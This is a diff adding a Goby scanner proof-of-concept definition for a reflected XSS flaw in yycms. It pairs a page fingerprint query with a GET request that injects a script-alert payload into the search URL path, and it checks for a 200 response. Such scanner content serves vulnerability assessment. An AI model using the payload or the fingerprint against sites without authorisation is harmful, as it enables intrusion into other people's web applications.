@@ -1,0 +1,53 @@
+{
+      "Name": "yycms-XSS",
+      "Level": "0",
+      "Tags": [],
+      "GobyQuery": "body=\"templets/yycms/css/\"",
+      "Description": "",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/search-<script>alert(/xss/)</script>.html",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "text/html; charset=utf-8"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "font",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "2021-04-19 11:01:23",
+      "GobyVersion": "1.8.230"
+}
